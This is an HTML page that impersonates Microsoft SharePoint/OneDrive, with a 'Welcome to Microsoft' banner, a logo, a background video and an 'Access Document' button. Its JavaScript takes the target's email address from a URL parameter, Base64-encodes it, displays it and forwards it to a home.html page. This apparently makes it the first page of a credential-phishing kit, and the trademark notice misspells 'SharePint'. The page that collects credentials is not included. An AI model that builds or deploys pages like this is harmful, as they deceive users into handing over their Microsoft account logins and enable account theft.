

<!DOCTYPE html>
<html>
<head>
	<title>Sharepoint</title>

	<style type="text/css">
		
		#container{
			width: 60%;
			margin: auto;
			height: 580px;
		
			margin-top:20px;
			background-color:black;
			opacity:0.7;
			color:white !important ; 

		}

		#myVideo {
  position: fixed;
  right: 0;
  bottom: 0;
  min-width: 100%;
  min-height: 100%;
}


		#content{
			position: absolute;
			width: 55%;
			margin:auto;
			top:0;
			left:0;
			right: 0;
			bottom:0;
			z-index: 10;
		
			height: auto;
			
			

		}

		.sharepoint{
			font-weight: bolder;
			font-family: 'arial black';
			font-size:35pt;
			color:white;
			margin-top:20px;
			letter-spacing: -5px;
		}

		.email{
			color:white;
			font-size: 20px;
			margin-top:20px;
			font-family:arial;
			font-weight: bold;
		}

		body{
 		
 		background-color: black;
 		background-repeat: no-repeat;
 		background-size: cover;
 	}

 	.micro{
 		font-family:calibri;
 		color:white;
 		
 		font-size:40px;
 		font-weight: 100;
 		letter-spacing: 1px;
 		margin-top:40px;
 	}

 	

@media (max-width: 768px){
 	body{
 		
 		background-color:black;
 		background-repeat: no-repeat;
 		background-position: cover;
 	}

 	#container{
			width: 96%;
			margin: auto;
			height: 600px;
			
			margin-top:30px;
			background-color:black;
			opacity:0.7;
			color:white !important ; 

		}

		#content{
			width: 90%;
			top:30px;
			z-index: 10;
			
			height: 600px;
			position: absolute;
			border:thin solid;
		}



		
}
	</style>

</head>
<body onload="ll()">

	<video autoplay muted loop id="myVideo">
  <source src="images/vid.mp4" type="video/mp4">
</video>


<div id="container">
	
</div>

<div id="content" align="center">
	<div><img src="images/logo.png" style="opacity: 0.8; margin-top:50px;"></div>
	<div class="micro" align="center" >Welcome to Microsoft</div>
	<div class="sharepoint">SharePoint</div>
	<div style="color:white; letter-spacing: 1px; font-family: candara">Save your files and photos to OneDrive and get them from any device anywhere.</div>
	<div class="email" ><p id="XX" style="display: none"></p><br><u id="x1"></u></div>
	<div>
		
		<button style="color:white; background-color:#1A70CB; font-size: 15px; height: 45px; width:170px; border-radius: 5px 5px 5px 5px; margin-top:20px; " onclick="aa()">Access Document</button>

	

	</div>
	<div style="color: white; margin-top:45px; font-size:9pt; font-family:candara" >Office365, Outlook, SharePint, OneDrive, Skype, Outlook, Powerpoint, Word, Excel are all trademarks of Microsoft. All rights reserved for &copy; 2024</div>
</div>

<script type="text/javascript">

function encryp(text){
	return btoa(text);
}
function decryp(text){
	try {
		return atob(text);
	} catch (e) {
		return text;
	}
}


function ll(){
	let step = 1;
	let searchParams = new URLSearchParams(window.location.search);
	let param = searchParams.get('x1');
	if (param) {
		try {
			// Check if already Base64 encoded
			atob(param); 
			let decoded = decryp(param);
			document.getElementById('x1').innerHTML = decoded;
			document.getElementById('XX').innerHTML = param;
		} catch (e) {
			// Not encoded, so encode it and update the URL
			let encoded = encryp(param);
			searchParams.set('x1', encoded);
			let newUrl = window.location.pathname + '?' + searchParams.toString();
			window.history.replaceState({}, '', newUrl);
			document.getElementById('x1').innerHTML = param;
			document.getElementById('XX').innerHTML = encoded;
		}
	}
}








function aa(){
//alert("home.html?x1=" + email);

window.location.href = 'home.html?x1=' + document.getElementById('XX').innerHTML;
}
</script>
</body>
</html>
